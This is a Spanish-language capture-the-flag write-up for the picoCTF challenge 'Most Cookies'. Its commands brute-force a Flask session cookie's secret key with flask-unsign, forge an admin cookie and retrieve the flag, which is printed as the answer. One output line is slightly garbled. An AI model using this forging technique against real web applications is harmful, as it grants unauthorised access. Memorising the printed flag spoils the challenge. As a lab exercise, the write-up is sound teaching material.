# Most Cookies

## Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:52566/
## Solución

```
Se crasheo mi maquina por lo que el procedimiento anterior lo perdi pero es solo crear una instancia virtual para instalar flask-unsign 

┌──(flavio㉿kali)-[~]
└─$ source ~/.venv/bin/activate
                                                                                                                                                                                                                  
┌──(.venv)─(flavio㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aakDbw.8EtARDfieZZnLyOiBDHpOL0NgSE" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'crinkle'
                                                                                                                                                                                                                  
┌──(.venv)─(flavio㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "crinkle"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aakEHQ.kadFZvVZLXLTIhEnbgRRBnFNauk
                                                                                                                                                                                                                  
┌──(.venv)─(flavio㉿kali)-[~]
└─$ curl -s http://wily-courier.picoctf.net:58252/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aakEHQ.kadFZvVZLXLTIhEnbgRRBnFNauk" | grep pico 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_485f560e}</code></p>
```

picoCTF{cO0ki3s_yum_485f560e}
## Notas adicionales

Hacemos uso de flag-unsign para poder conseguir la palabra clave de una cookie y así cambiarla para obtener la flag.
## Referencias

https://github.com/Paradoxis/Flask-Unsign